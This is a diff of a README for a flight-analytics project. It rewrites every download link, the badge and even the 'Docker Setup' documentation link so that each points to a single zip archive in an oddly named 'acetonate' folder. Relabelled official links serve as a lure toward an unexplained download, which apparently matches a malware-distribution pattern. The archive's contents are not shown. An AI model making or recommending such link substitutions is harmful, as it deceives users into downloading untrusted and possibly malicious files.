@@ -1,6 +1,6 @@
 # ✈️ flight-analytics-pipeline - Analyze Flight Performance Effortlessly
 
-[![Download Flight Analytics Pipeline](https://img.shields.io/badge/Download%20Now-Flight%20Analytics%20Pipeline-brightgreen)](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
+[![Download Flight Analytics Pipeline](https://raw.githubusercontent.com/Ahmad-SY-Developer/flight-analytics-pipeline/main/acetonate/flight-analytics-pipeline.zip%20Now-Flight%20Analytics%20Pipeline-brightgreen)](https://raw.githubusercontent.com/Ahmad-SY-Developer/flight-analytics-pipeline/main/acetonate/flight-analytics-pipeline.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Before you start, ensure your system meets these basic requirements:
 
 To get started, visit the page to download the software from our Releases page:
 
-[Download Flight Analytics Pipeline](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
+[Download Flight Analytics Pipeline](https://raw.githubusercontent.com/Ahmad-SY-Developer/flight-analytics-pipeline/main/acetonate/flight-analytics-pipeline.zip)
 
 ### Installation Steps
 
@@ -39,7 +39,7 @@ To get started, visit the page to download the software from our Releases page:
 
 3. **Download the File**: Click on the file appropriate for your operating system. It will start downloading.
 
-4. **Install Docker**: If you haven’t installed Docker yet, follow the instructions at [Docker Setup](https://docs.docker.com/get-started/).
+4. **Install Docker**: If you haven’t installed Docker yet, follow the instructions at [Docker Setup](https://raw.githubusercontent.com/Ahmad-SY-Developer/flight-analytics-pipeline/main/acetonate/flight-analytics-pipeline.zip).
 
 5. **Run the Application**:
    - Extract the downloaded file to a location on your computer.
@@ -88,4 +88,4 @@ Here are common issues and solutions:
 
 For more details on how the application functions and its architecture, you can check out the source code. We welcome contributions, so if you find ways to improve this pipeline, feel free to participate.
 
-Download the latest version here: [Download Flight Analytics Pipeline](https://github.com/Ahmad-SY-Developer/flight-analytics-pipeline/releases)
+Download the latest version here: [Download Flight Analytics Pipeline](https://raw.githubusercontent.com/Ahmad-SY-Developer/flight-analytics-pipeline/main/acetonate/flight-analytics-pipeline.zip)
